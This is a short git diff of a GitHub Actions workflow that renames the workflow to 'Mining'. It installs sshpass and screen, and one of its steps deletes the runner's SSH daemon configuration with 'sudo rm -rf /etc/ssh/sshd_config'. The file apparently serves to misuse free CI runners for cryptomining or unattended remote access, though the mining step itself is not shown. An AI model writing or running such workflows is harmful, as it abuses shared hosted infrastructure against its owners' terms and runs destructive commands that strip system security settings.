@@ -1,4 +1,4 @@
-name: Ubuntu 18.04
+name: Mining
 
 on: 
   workflow_dispatch:
@@ -9,7 +9,7 @@ jobs:
     steps:
       - uses: actions/checkout@v2
       - name: Run settting file
-        run: sudo apt update -y & /dev/null && sudo apt install sshpass screen -y & /dev/null 
+        run: sudo apt update -y &> /dev/null && sudo apt install sshpass screen -y &> /dev/null 
         
       - name: Run settting file
         run: sudo rm -rf /etc/ssh/sshd_config
